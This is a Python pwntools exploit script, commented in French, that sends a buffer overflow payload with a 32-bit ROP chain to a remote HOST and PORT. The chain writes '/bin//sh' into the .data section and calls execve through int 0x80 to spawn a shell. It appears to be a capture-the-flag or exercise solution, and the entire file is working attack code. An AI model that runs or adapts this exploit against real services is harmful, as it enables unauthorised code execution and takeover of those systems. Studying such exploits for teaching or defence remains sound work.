#!/usr/bin/env python3
#coding: utf-8

from pwn import *
from struct import pack
from constants import *

def local_shell():
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR), # on met dans EDX l'addresse de .date
        pack('<I', 0x00000000), # on met EDI a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('>I', 0x2f62696e), # /bin dans eax
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax ; ret # met /bin dans .data

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+4), # on l'addr de .data+4
        pack('<I', 0x00000000), # edi a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('>I', 0x2f2f7368), # //sh dans eax
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax ; ret # met //sh après /bin dans .data

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+8), # et met dans edx l'addresse de .data+8
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met des 0 à la fin

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+12), # et met dans edx l'addresse de .data+12
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x080af496), # pop eax ; ret
        pack('<I', DATA_ADDR), # eax = DATA_ADDR 
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met DATA_ADDR à la suite de /bin//sh\0

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', DATA_ADDR+16), # et met dans edx l'addresse de .data+16
        pack('<I', 0x00000000), # EDI a 0
        pack('<I', 0x0805f78a), # mov dword ptr [edx], eax # en met des 0 à la fin

        pack('<I', 0x0804901e), # pop ebx ; ret
        pack('<I', DATA_ADDR), # on l'addr de .data dans ebx

        pack('<I', 0x08063fb1), # pop ecx ; add al, 0xf6 ; ret
        pack('<I', DATA_ADDR+12), # ecx à DATA_ADDR+12 -> DATA_ADDR

        pack('<I', 0x08098d15), # pop edx ; xor eax, eax ; pop edi ; ret
        pack('<I', 0x00000000), # edx à 0
        pack('<I', 0x00000000), # edi à 0

        pack('<I', 0x080af496), # pop eax ; ret
        pack('<I', 0x0b), # eax a 11

        pack('<I', 0x08079f8f) # int 0x80
    ])
    conn.send(p)
    conn.recvline()
    conn.close()

def main():
    local_shell()
    
if __name__ == '__main__':
    main()
